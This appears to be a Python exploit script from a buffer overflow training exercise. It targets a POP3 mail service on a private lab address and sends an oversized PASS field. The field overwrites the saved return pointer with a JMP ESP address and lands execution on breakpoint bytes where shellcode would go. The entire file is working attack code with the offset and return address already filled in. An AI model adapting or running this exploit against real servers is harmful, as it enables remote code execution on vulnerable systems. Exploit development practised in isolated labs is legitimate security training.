#!/usr/bin/python
import socket
import struct

# Constants
RHOST = "192.168.80.134"
RPORT = 110
len_buffer = 3500
offset_srp = 2606
ptr_jmp_esp = 0x5F4A358F

# Create the buffer
buffer = ""
buffer += "A"*(offset_srp - len(buffer))	# padding
buffer += struct.pack("<I", ptr_jmp_esp)	# SRP overwrite
buffer += "\xCC\xCC\xCC\xCC"		        # ESP should end up pointing here
buffer += "D"*(len_buffer - len(buffer))	# Training padding
buffer += "\n"

try:        
    # create a TCP connection (socket)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))

    # Recieve the banner
    data = s.recv(1024)
    print("Received: {0}".format(data))

    # Send the username
    data = "USER test\r\n"
    s.send(data)
    print("Sent: {0}".format(data))
    data = s.recv(1024)
    print("Received: {0}".format(data))

    # Send the pasword
    data = "PASS " + buffer + "\r\n"
    s.send(data)
    print("Sent: {0}".format(data))
    data = s.recv(1024)
    print("Received: {0}".format(data))

    # Close the socket
    s.send("QUIT\r\n")
    s.close()
    print("\n[+] Done")
except:
    print("\n[-] Could not connect to POP3...")